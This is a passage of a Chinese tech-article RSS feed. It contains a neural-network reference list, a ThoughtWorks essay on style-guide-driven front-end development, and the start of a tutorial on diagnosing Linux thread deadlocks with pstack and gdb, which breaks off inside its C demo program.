&lt;p&gt;&lt;strong&gt;参考文献：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.&lt;a href=&quot;https://www.doc.ic.ac.uk/~nd/surprise_96/journal/vol4/cs11/report.html&quot; target=&quot;_blank&quot;&gt;Neural Networks&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2.&lt;a href=&quot;http://ufldl.stanford.edu/wiki/index.php/Neural_Networks&quot; target=&quot;_blank&quot;&gt;Andrew Ng Neural Networks &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;3.&lt;a href=&quot;http://www.36dsj.com/archives/20804&quot; target=&quot;_blank&quot;&gt;神经网络简史&lt;/a&gt;&lt;a href=&quot;http://www.36dsj.com/archives/20804&quot; target=&quot;_blank&quot;&gt;&lt;br&gt;
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;4.&lt;a href=&quot;http://www.intsci.ac.cn/shizz/course/kd08.ppt&quot; target=&quot;_blank&quot;&gt;中科院 史忠植 神经网络 讲义&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;5.&lt;a href=&quot;http://caai.cn/contents/118/1934.html&quot; target=&quot;_blank&quot;&gt;深度学习 胡晓林&lt;/a&gt;&lt;/p&gt;

        
        
        
    &lt;div class=&quot;post-adds&quot;&gt;
        &lt;span data-post-id=&quot;109748&quot; class=&quot; btn-bluet-bigger href-style vote-post-up   register-user-only &quot;&gt;&lt;i class=&quot;fa  fa-thumbs-o-up&quot;&gt;&lt;/i&gt; &lt;h10 id=&quot;109748votetotal&quot;&gt;4&lt;/h10&gt; 赞&lt;/span&gt;
        &lt;span data-book-type=&quot;1&quot; data-site-id=&quot;2&quot; data-item-id=&quot;109748&quot; data-item-type=&quot;1&quot; class=&quot; btn-bluet-bigger href-style bookmark-btn  register-user-only &quot;&gt;&lt;i class=&quot;fa fa-bookmark-o  &quot;&gt;&lt;/i&gt; 13 收藏&lt;/span&gt;

                    &lt;a href=&quot;#article-comment&quot;&gt;&lt;span class=&quot;btn-bluet-bigger href-style hide-on-480&quot;&gt;&lt;i class=&quot;fa fa-comments-o&quot;&gt;&lt;/i&gt; 3 评论&lt;/span&gt;&lt;/a&gt;
        
        
        
        &lt;!-- JiaThis Button BEGIN --&gt;
        &lt;div class=&quot;jiathis_style_24x24&quot; style=&quot;display: inline-flex; position: relative; margin: 0; clear: both;float: right;&quot;&gt;
            &lt;a class=&quot;jiathis_button_tsina&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_weixin&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_qzone&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_fb hide-on-480&quot;&gt;&lt;/a&gt;
            &lt;a href=&quot;http://www.jiathis.com/share?uid=1745061&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;
        &lt;/div&gt;

    &lt;/div&gt;




        &lt;!-- BEGIN #author-bio --&gt;


&lt;!-- END #author-bio --&gt;
	

</description>
        <pubDate>Mon, 09 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2017/2017-01-09-109748-dbd21ac92.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2017/2017-01-09-109748-dbd21ac92.html</guid>
        
        
        <category>jobbole</category>
        
      </item>
    
      <item>
        <title>你听说过“风格指南驱动开发”吗？</title>
        <description>


        			&lt;div class=&quot;textwidget&quot;&gt;
&lt;/div&gt;
		
		&lt;div&gt;
&lt;h3&gt;从“敏捷”下手&lt;/h3&gt;
&lt;p&gt;“今天，客户的UX又给我邮件了一版新的设计（PDF文件），改动不大，无非就是这个高度再调高点、那个宽度再调小些、这里用粗体、那边用18px的字体，可以参考以前做的手风琴组件的body部分，还有就是，顺便把手机版的样式截个图发过来？”&lt;/p&gt;
&lt;p&gt;我：“能告诉我宽度和高度的具体值吗？那个手风琴组件可以在哪个页面找到？”&lt;/p&gt;
&lt;p&gt;另一个开发告诉我：”先凭感觉做，然后再找UX面对面的按照要求一个个过。“&lt;/p&gt;
&lt;p&gt;我：”好，面对面谈，总比邮件来回要快些。“&lt;/p&gt;
&lt;p&gt;UX答复我：”面对面谈可能没有时间，你能先做一个粗略的版本吗？我先看看，然后给你反馈。等你做完所有的部分，我们再约个时间一起过”&lt;/p&gt;
&lt;p&gt;即便心里在暗骂（等我做完了，你又跟我说这个不对，那个不对？）嘴上还是说了，“可以。”&lt;/p&gt;
&lt;p&gt;然后，我问QA：“有测试环境可以部署我的新代码吗？没有完全做完，但是要给UX看效果。”&lt;/p&gt;
&lt;p&gt;QA说：“有，但是部署完估计要1个多小时。”&lt;/p&gt;
&lt;p&gt;我看了下时间，再过一个小时，客户UX就下班了，要得到他/她的反馈，估计得明天了！&lt;/p&gt;
&lt;p&gt;当我把这个故事讲给别人听的时候，一般会得到两个回复：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;哎呀，跟我们一样，痛苦的很&lt;/li&gt;
&lt;li&gt;你们怎么这么不敏捷？&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;我无法否认这两个说法，很痛苦，也确实不够敏捷。但为我们提供了一点点线索——敏捷。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://insights.thoughtworkers.org/wp-content/uploads/2017/01/1-agile.png&quot;&gt;&lt;img src=&quot;/images/jobbole.com/334b0e24a1cd0010283e23f1a0bdde62.jpg&quot; alt=&quot;1-agile&quot; width=&quot;900&quot; height=&quot;641&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;敏捷宣言中强调：个体和互动高于流程和工具，工作的软件高于详尽的文档。&lt;/p&gt;
&lt;p&gt;上面的故事很明显并不满足敏捷的价值观，邮件和截图绝对不可能代表“个体和互动”，一个需要部署一个小时才能看到页面效果的应用也谈不上“可工作的软件”。&lt;/p&gt;
&lt;h3&gt;怎么破？引入“在线风格指南”&lt;/h3&gt;
&lt;p&gt;针对当前的痛点，想要破，需要做到至少下面三点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;独立前端开发工作，让它与后端逻辑解耦（俗称“前后端分离”）&lt;/li&gt;
&lt;li&gt;建立“可工作的软件”来展示前端开发结果&lt;/li&gt;
&lt;li&gt;组件化的设计和开发流程&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;看到这三点，明白人可能会立刻联想到一个大家耳熟能详的前端开发框架：Bootstrap。没错，它作为一个优秀的前端开发框架，确实满足上面的要求，有许多不错的网站都将Bootstrap作为网站的前端骨架。&lt;/p&gt;
&lt;p&gt;Bootstrap有两个特质非常吸引人，&lt;strong&gt;优秀的特性和组件和漂亮的开发文档&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;不过，今天我们不谈Bootstrap框架，我想来聊聊这个漂亮的开发文档，俗称“在线风格指南”。&lt;/p&gt;
&lt;p&gt;相信大家对“风格指南”都不陌生，主要分两类：静态风格指南和动态风格指南。&lt;/p&gt;
&lt;p&gt;静态风格指南也就是我们常见的静态设计文档，比如，由设计师提供的PSD/PDF等文件，文档中包含：调色板，字体，按钮，链接等等。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://insights.thoughtworkers.org/wp-content/uploads/2017/01/2-style-guide.png&quot;&gt;&lt;img src=&quot;/images/jobbole.com/5dbbad9c494e01d9751c7ae816010298.jpg&quot; alt=&quot;2-style-guide&quot; width=&quot;700&quot; height=&quot;453&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;（medialoot上的一个样例）&lt;/p&gt;
&lt;p&gt;动态风格指南，也称为Living Style Guide（“活的”风格指南或者在线风格指南），它是一个包含风格指南的Web站点，就像Bootstrap开发文档一样。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://insights.thoughtworkers.org/wp-content/uploads/2017/01/3-living-style-guide.png&quot;&gt;&lt;img src=&quot;/images/jobbole.com/60c416ae3d72c8839eca2d456ef40530.jpg&quot; alt=&quot;3-living-style-guide&quot; width=&quot;600&quot; height=&quot;490&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在这里，我们需要引入的是“在线风格指南”，而不是Bootstrap，这里的不同点在于：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;角色变化，我们从“风格指南”的使用者，变成了是它的拥有者、开发者和使用者。&lt;/li&gt;
&lt;li&gt;用户变化，它不再是开发文档，现在用户是UX、前端开发和BA（业务分析），在UX和BA的眼中看到的文档即最新实现结果，在前端开发眼中看到的代码即设计。&lt;/li&gt;
&lt;li&gt;侧重不同，不仅仅是基础组件，也具有更加偏业务的大型组件。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;为什么还要组件化的设计和开发？&lt;/h3&gt;
&lt;p&gt;组件化的做法在当前的场景下，似乎有点顺其自然，特别是有Bootstrap作为前车之鉴。&lt;/p&gt;
&lt;p&gt;我想大家都知道，前端开发其实有一个通病，即大量的JS、CSS和其他资源文件（字体文件、图标、图片），在没有很好的管理控制下，很容易导致资源的冗余，依赖关系复杂度增加、维护性降低、导致之后的开发难度变大。&lt;/p&gt;
&lt;p&gt;和后端语言开发不同，比如，Java有包管理和类的支持，有一些常见（或者约定俗成）的实现层次，如：Controller、Service、Repository等；有框架和语言特性带来的优势，比如IOC、AOP、注解、继承、接口等，合理利用能够让代码职责单一，模块高内聚低耦合，接口化，可重用，易于测试等等。&lt;/p&gt;
&lt;p&gt;而Web前端开发，由于涉及到的内容较广，又不太可能完全具备后端语言的优秀特性。所以，更加需要开发人员具有优秀的设计和管理思想，比如：CSS的合理命名和管理、有效利用CSS预处理器、JavaScript的模块化、框架的特性（比如AngularJS的依赖注入，指令）、以及组件化等等。&lt;/p&gt;
&lt;p&gt;组件化其实是大型软件开发中的一个共识，特别是前端，在没有统一标准的前提下，大家都在不断的造轮子，有无数的人倒了下去，又有无数勇士踩着前者的尸体冲上来。也许是因为它确实能够具有一些非常优秀的特性：单一的职责、资源的高内聚、独立的作用域、可独立的测试、接口的规范化、可重用、可组合等。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://insights.thoughtworkers.org/wp-content/uploads/2017/01/4-folder-structure.png&quot;&gt;&lt;img src=&quot;/images/jobbole.com/e9f3ab8a6030117ff8d8d0fd96d75fb9.jpg&quot; alt=&quot;4-folder-structure&quot; width=&quot;378&quot; height=&quot;515&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;我们项目的代码组织结构&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;从“风格指南”到“驱动开发”&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;总结一下前面的内容，“前后端分离”，“在线风格指南”，“组件化开发”，似乎我们只说到一些与开发相关的事情，其实不然。&lt;/p&gt;
&lt;p&gt;“在线风格指南”被开发，UX、BA共享，合理的组件划分可以合理控制开发闭环，UX可以更快的看到设计实现的原型，提升团队成员沟通频率，BA可以方便的根据组件合理的编写Story（故事卡）。&lt;/p&gt;
&lt;p&gt;当这三个角色都参与到这个过程当中时，我们就真正回到今天的正题“风格指南驱动开发”。&lt;/p&gt;
&lt;p&gt;这是一个相当新的术语，但不是我发明的，如果要追溯的话，最早在公开场合中谈到这个概念的人应该是Nicole Sullivan，她在2014年9月的一次演讲《Components &amp;amp; SGDD》中提出（Nicole Sullivan目前在NPM这家公司，没错，就是那个NPM，做Product Manager &amp;amp; Design Manager）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;“风格指南驱动开发”尝试着：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;让UX和前端开发更紧密的工作在一起，将设计与前端开发的工作闭环缩小，更快速的迭代产品原型。&lt;/li&gt;
&lt;li&gt;将UI开发和业务系统分离开，业务系统不仅仅是指后端系统（不仅仅是前后端分离），也包括业务的Web系统。&lt;/li&gt;
&lt;li&gt;让设计文档更加“灵活”，更加及时（up to date），更加一致（single source of truth）。&lt;/li&gt;
&lt;li&gt;让前端资源管理更加规范，开发模式更加清晰。&lt;/li&gt;
&lt;li&gt;让整个Web开发周期更加敏捷（Agile）。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;它是一种前端开发和团队工作方式的实践。&lt;/p&gt;
&lt;h3&gt;工作流程 – 如何“驱动开发”？&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;http://insights.thoughtworkers.org/wp-content/uploads/2017/01/5-sgdd-process.png&quot;&gt;&lt;img src=&quot;/images/jobbole.com/6f78a6419672ba25be289e71ece40752.jpg&quot; alt=&quot;5-sgdd-process&quot; width=&quot;700&quot; height=&quot;199&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;开发流程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;怎么样的工作方式，才算“风格指南驱动开发”？其实，当团队拥有了“组件化的思想”和“在线风格指南”，“风格指南驱动开发”的整个过程其实是行云流水的，我简单描述一下：&lt;/p&gt;
&lt;p&gt;1.挖掘到新的需求/特性&lt;/p&gt;
&lt;p&gt;当新的需求出现时，UX开始进行页面设计，Living Style Guide会作为设计的参考文档。通常情况，设计师会查看已有的调色板、字体和其他基本元素或组件来组成新的页面布局。在组件化的思想和Living Style Guide的帮助下，BA和设计师都会尝试使用或者扩展现有的组件。&lt;/p&gt;
&lt;p&gt;2.抽象成组件&lt;/p&gt;
&lt;p&gt;一旦设计完成，BA、UX和开发会开始讨论如何把新的设计细分为独立的组件，哪些是已经存在可以重用的，哪些是新的需用新建或者扩展实现的。Living Style Guide作为桥梁帮助设计与开发进行沟通，促进双方的理解，确保实现的准确性。而抽象出来的组件，帮助BA划分任务和故事（Story），以便更加准确的估算“故事点”。&lt;/p&gt;
&lt;p&gt;3.实现和文档化&lt;/p&gt;
&lt;p&gt;此时，Living Style Guide是作为一个开发框架和设计试验场（playground）。&lt;/p&gt;
&lt;p&gt;作为一个试验场（playground），允许你随时看到每一个开发出来的组件，作为开发框架，允许你快速开发，它和真正的产品实现完全隔离，这种隔离会鼓励你以更加抽象的方式创建组件，以便于让他们更容易被重用。&lt;/p&gt;
&lt;p&gt;Living Style Guide的开发注重组件化的隔离和规范化的开发流程（套路清晰明了），我们常常会开发一些自动化的构建任务来帮助快速初始化一个组件需要的基本内容，只要开发人员对开发所需的前端技术栈有掌握，就能较快速的开发完成相应的组件。&lt;/p&gt;
&lt;p&gt;而开发完成的组件在Living Style Guide中立刻变成“活的文档”，可以快速展示各种不同的组件应用场景，提供给UX和BA做审查（review）。&lt;/p&gt;
&lt;p&gt;4.组件在产品应用中的热插拔&lt;/p&gt;
&lt;p&gt;最后一步，就是将组件应用到真正的产品实现中（该产品代码应该是与Living Style Guide毫无关系的业务代码）。而对于Living Style Guide输出的结果，应该可以任意选择刚好满足需求所需要的组件，拥有足够的灵活性，才能实现它在产品应用代码中的热插拔。&lt;/p&gt;
&lt;p&gt;如果还有第5步的话，那就是重复上面的4步，这就是“风格指南驱动开发”的完整流程。&lt;/p&gt;
&lt;h3&gt;留在最后的思考 – 它到底驱动了什么？&lt;/h3&gt;
&lt;p&gt;作为好奇宝宝的你们和我，当读完这篇文章，应该仍然在思考，它到底驱动了什么？&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://insights.thoughtworkers.org/wp-content/uploads/2017/01/6-haoqi.jpg&quot;&gt;&lt;img src=&quot;/images/jobbole.com/06cf533dd44584c3dd1d4519e990913f.jpg&quot; alt=&quot;6-haoqi&quot; width=&quot;576&quot; height=&quot;1024&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;也许你比较熟悉TDD和BDD，他们通过测试，驱动我们编写刚好满足测试和满足需求的实现，而测试反过来成为保护伞，在我们通过重构提升代码质量的同时，保证功能的安全性。&lt;/p&gt;

&lt;/div&gt;

        
        
        
    &lt;div class=&quot;post-adds&quot;&gt;
        &lt;span data-post-id=&quot;109747&quot; class=&quot; btn-bluet-bigger href-style vote-post-up   register-user-only &quot;&gt;&lt;i class=&quot;fa  fa-thumbs-o-up&quot;&gt;&lt;/i&gt; &lt;h10 id=&quot;109747votetotal&quot;&gt;1&lt;/h10&gt; 赞&lt;/span&gt;
        &lt;span data-book-type=&quot;1&quot; data-site-id=&quot;2&quot; data-item-id=&quot;109747&quot; data-item-type=&quot;1&quot; class=&quot; btn-bluet-bigger href-style bookmark-btn  register-user-only &quot;&gt;&lt;i class=&quot;fa fa-bookmark-o  &quot;&gt;&lt;/i&gt; 1 收藏&lt;/span&gt;

                    &lt;a href=&quot;#article-comment&quot;&gt;&lt;span class=&quot;btn-bluet-bigger href-style hide-on-480&quot;&gt;&lt;i class=&quot;fa fa-comments-o&quot;&gt;&lt;/i&gt;  评论&lt;/span&gt;&lt;/a&gt;
        
        
        
        &lt;!-- JiaThis Button BEGIN --&gt;
        &lt;div class=&quot;jiathis_style_24x24&quot; style=&quot;display: inline-flex; position: relative; margin: 0; clear: both;float: right;&quot;&gt;
            &lt;a class=&quot;jiathis_button_tsina&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_weixin&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_qzone&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_fb hide-on-480&quot;&gt;&lt;/a&gt;
            &lt;a href=&quot;http://www.jiathis.com/share?uid=1745061&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;
        &lt;/div&gt;

    &lt;/div&gt;




        &lt;!-- BEGIN #author-bio --&gt;

&lt;div id=&quot;author-bio&quot;&gt;
	
	&lt;h3 class=&quot;widget-title&quot;&gt;
	关于作者：&lt;a target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/thoughtworkschina&quot;&gt;ThoughtWorks&lt;/a&gt;
	&lt;/h3&gt;
	&lt;div class=&quot;alignleft&quot;&gt;
		&lt;a target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/thoughtworkschina&quot;&gt;
			&lt;img src=&quot;/images/jobbole.com/8a86f1338baa47a6e6bd4a03d41e36e6.jpg&quot;&gt;
		&lt;/a&gt;
	&lt;/div&gt;

    &lt;div class=&quot;author-bio-info&quot;&gt;

        &lt;span class=&quot;author-bio-info-block&quot;&gt;
            ThoughtWorks是一家全球IT咨询公司，追求卓越软件质量，为客户提供注重实效的咨询服务（IT组织优化、技术咨询、测试策略、客户体验）。同时我们也擅长构建定制化系统和产品，帮助客户快速将概念转化为价值。 我们满怀信心和激情，不断推动敏捷在中国IT业的推广和应用，提升中国软件开发的生产力。        &lt;/span&gt;
        &lt;span class=&quot;author-bio-info-block&quot;&gt;
            &lt;a href=&quot;http://www.jobbole.com/members/thoughtworkschina&quot; target=&quot;_blank&quot;&gt;&lt;i class=&quot;fa fa-user&quot;&gt;&lt;/i&gt; 个人主页&lt;/a&gt; ·
            &lt;a href=&quot;http://blog.jobbole.com/author/thoughtworkschina/&quot; target=&quot;_blank&quot;&gt;&lt;i class=&quot;fa fa-file-text-o&quot;&gt;&lt;/i&gt; 我的文章&lt;/a&gt;

             · &lt;a title=&quot;声望值&quot; target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/thoughtworkschina/reputation/&quot;&gt;&lt;i class=&quot;fa fa-graduation-cap&quot;&gt;&lt;/i&gt; 30&lt;/a&gt; · &lt;a title=&quot;我的网站&quot; target=&quot;_blank&quot; href=&quot;http://insights.thoughtworkers.org/&quot;&gt;&lt;i class=&quot;fa fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt; &lt;a title=&quot;微博主页&quot; target=&quot;_blank&quot; href=&quot;http://weibo.com/thoughtworkschina&quot;&gt;&lt;i class=&quot;fa fa-weibo&quot;&gt;&lt;/i&gt;&lt;/a&gt;         &lt;/span&gt;
    &lt;/div&gt;
	&lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;!-- END #author-bio --&gt;
	

</description>
        <pubDate>Mon, 09 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2017/2017-01-09-109747-f878e0305.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2017/2017-01-09-109747-f878e0305.html</guid>
        
        
        <category>jobbole</category>
        
      </item>
    
      <item>
        <title>一个 Linux 上分析死锁的简单方法</title>
        <description>


        			&lt;div class=&quot;textwidget&quot;&gt;
&lt;/div&gt;
		
		&lt;div&gt;
&lt;h2 id=&quot;major1&quot;&gt;简介&lt;/h2&gt;
&lt;p&gt;死锁 (deadlocks)： 是指两个或两个以上的进程（线程）在执行过程中，因争夺资源而造成的一种互相等待的现象，若无外力作用，它们都将无法推进下去。此时称系统处于死锁状态或系统产生了死锁，这些永远在互相等待的进程（线程）称为死锁进程（线程）。 由于资源占用是互斥的，当某个进程提出申请资源后，使得有关进程（线程）在无外力协助下，永远分配不到必需的资源而无法继续运行，这就产生了一种特殊现象死锁。&lt;/p&gt;
&lt;p&gt;一种交叉持锁死锁的情形，此时执行程序中两个或多个线程发生永久堵塞（等待），每个线程都在等待被其它线程占用并堵塞了的资源。例如，如果线程 1 锁住了记录 A 并等待记录 B，而线程 2 锁住了记录 B 并等待记录 A，这样两个线程就发生了死锁现象。在计算机系统中 , 如果系统的资源分配策略不当，更常见的可能是程序员写的程序有错误等，则会导致进程因竞争资源不当而产生死锁的现象。&lt;/p&gt;
&lt;h2 id=&quot;major2&quot;&gt;产生死锁的四个必要条件&lt;/h2&gt;
&lt;p&gt;（1） 互斥条件：一个资源每次只能被一个进程（线程）使用。&lt;br&gt;
（2） 请求与保持条件：一个进程（线程）因请求资源而阻塞时，对已获得的资源保持不放。&lt;br&gt;
（3） 不剥夺条件 : 此进程（线程）已获得的资源，在末使用完之前，不能强行剥夺。&lt;br&gt;
（4） 循环等待条件 : 多个进程（线程）之间形成一种头尾相接的循环等待资源关系。&lt;/p&gt;
&lt;h5 id=&quot;fig1&quot;&gt;图 1. 交叉持锁的死锁示意图：&lt;/h5&gt;
&lt;p&gt;&lt;img class=&quot;alignnone&quot; src=&quot;/images/jobbole.com/a42e17a213b4b4e19442de456f467b57.jpg&quot; width=&quot;555&quot; height=&quot;390&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注释&lt;/strong&gt;：在执行 func2 和 func4 之后，子线程 1 获得了锁 A，正试图获得锁 B，但是子线程 2 此时获得了锁 B，正试图获得锁 A，所以子线程 1 和子线程 2 将没有办法得到锁 A 和锁 B，因为它们各自被对方占有，永远不会释放，所以发生了死锁的现象。&lt;/p&gt;
&lt;h2 id=&quot;major3&quot;&gt;使用 pstack 和 gdb 工具对死锁程序进行分析&lt;/h2&gt;
&lt;h3 id=&quot;minor3.1&quot;&gt;pstack 在 Linux 平台上的简单介绍&lt;/h3&gt;
&lt;p&gt;pstack 是 Linux（比如 Red Hat Linux 系统、Ubuntu Linux 系统等）下一个很有用的工具，它的功能是打印输出此进程的堆栈信息。可以输出所有线程的调用关系栈。&lt;/p&gt;
&lt;h3 id=&quot;minor3.2&quot;&gt;gdb 在 Linux 平台上的简单介绍&lt;/h3&gt;
&lt;p&gt;GDB 是 GNU 开源组织发布的一个强大的 UNIX 下的程序调试工具。Linux 系统中包含了 GNU 调试程序 gdb，它是一个用来调试 C 和 C++ 程序的调试器。可以使程序开发者在程序运行时观察程序的内部结构和内存的使用情况 .&lt;/p&gt;
&lt;p&gt;gdb 所提供的一些主要功能如下所示：&lt;/p&gt;
&lt;p&gt;1 运行程序，设置能影响程序运行的参数和环境 ;&lt;/p&gt;
&lt;p&gt;2 控制程序在指定的条件下停止运行；&lt;/p&gt;
&lt;p&gt;3 当程序停止时，可以检查程序的状态；&lt;/p&gt;
&lt;p&gt;4 当程序 crash 时，可以检查 core 文件；&lt;/p&gt;
&lt;p&gt;5 可以修改程序的错误，并重新运行程序；&lt;/p&gt;
&lt;p&gt;6 可以动态监视程序中变量的值；&lt;/p&gt;
&lt;p&gt;7 可以单步执行代码，观察程序的运行状态。&lt;/p&gt;
&lt;p&gt;gdb 程序调试的对象是可执行文件或者进程，而不是程序的源代码文件。然而，并不是所有的可执行文件都可以用 gdb 调试。如果要让产生的可执行文件可以用来调试，需在执行 g++（gcc）指令编译程序时，加上 -g 参数，指定程序在编译时包含调试信息。调试信息包含程序里的每个变量的类型和在可执行文件里的地址映射以及源代码的行号。gdb 利用这些信息使源代码和机器码相关联。gdb 的基本命令较多，不做详细介绍，大家如果需要进一步了解，请参见 gdb 手册。&lt;/p&gt;
&lt;h5 id=&quot;listing1&quot;&gt;清单 1. 测试程序&lt;/h5&gt;
&lt;div&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a973a07774403199713&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
 #include &amp;lt;unistd.h&amp;gt; 
 #include &amp;lt;pthread.h&amp;gt; 
 #include &amp;lt;string.h&amp;gt; 

 pthread_mutex_t mutex1 = PTHREAD_MUTEX_INITIALIZER; 
 pthread_mutex_t mutex2 = PTHREAD_MUTEX_INITIALIZER; 
 pthread_mutex_t mutex3 = PTHREAD_MUTEX_INITIALIZER; 
 pthread_mutex_t mutex4 = PTHREAD_MUTEX_INITIALIZER; 

 static int sequence1 = 0; 
 static int sequence2 = 0; 

 int func1() 
 { 
    pthread_mutex_lock(&amp;amp;mutex1); 
    ++sequence1; 
    sleep(1); 
    pthread_mutex_lock(&amp;amp;mutex2); 
    ++sequence2; 
    pthread_mutex_unlock(&amp;amp;mutex2); 
    pthread_mutex_unlock(&amp;amp;mutex1); 

    return sequence1; 
 } 

 int func2() 
 { 
    pthread_mutex_lock(&amp;amp;mutex2); 
    ++sequence2; 
    sleep(1); 
    pthread_mutex_lock(&amp;amp;mutex1); 
    ++sequence1; 
    pthread_mutex_unlock(&amp;amp;mutex1); 
    pthread_mutex_unlock(&amp;amp;mutex2); 

    return sequence2; 
 } 

 void* thread1(void* arg) 
 { 
    while (1) 
    { 
        int iRetValue = func1(); 

        if (iRetValue == 100000) 
        { 
            pthread_exit(NULL); 
        } 
    } 
 } 

 void* thread2(void* arg) 
 { 
    while (1) 
    { 
        int iRetValue = func2(); 

        if (iRetValue == 100000) 
        { 
            pthread_exit(NULL); 
        } 
    } 
 } 

 void* thread3(void* arg) 
 { 
    while (1) 
    { 
        sleep(1); 
        char szBuf[128]; 
        memset(szBuf, 0, sizeof(szBuf)); 
        strcpy(szBuf, &quot;thread3&quot;); 
    } 
 } 

 void* thread4(void* arg) 
 { 
    while (1) 
    { 
        sleep(1); 
        char szBuf[128]; 
        memset(szBuf, 0, sizeof(szBuf)); 
        strcpy(szBuf, &quot;thread3&quot;); 
    } 
 } 

 int main() 
 { 
    pthread_t tid[4]; 
    if (pthread_create(&amp;amp;tid[0], NULL, &amp;amp;thread1, NULL) != 0) 
    { 
        _exit(1); 
    } 
    if (pthread_create(&amp;amp;tid[1], NULL, &amp;amp;thread2, NULL) != 0) 
    { 
        _exit(1); 
    } 
    if (pthread_create(&amp;amp;tid[2], NULL, &amp;amp;thread3, NULL) != 0) 
    { 
        _exit(1); 
    } 
    if (pthread_create(&amp;amp;tid[3], NULL, &amp;amp;thread4, NULL) != 0) 
    { 
        _exit(1); 
    } 

    sleep(5); 
    //pthread_cancel(tid[0]); 

    pthread_join(tid[0], NULL); 
    pthread_join(tid[1], NULL); 
    pthread_join(tid[2], NULL); 
    pthread_join(tid[3], NULL); 

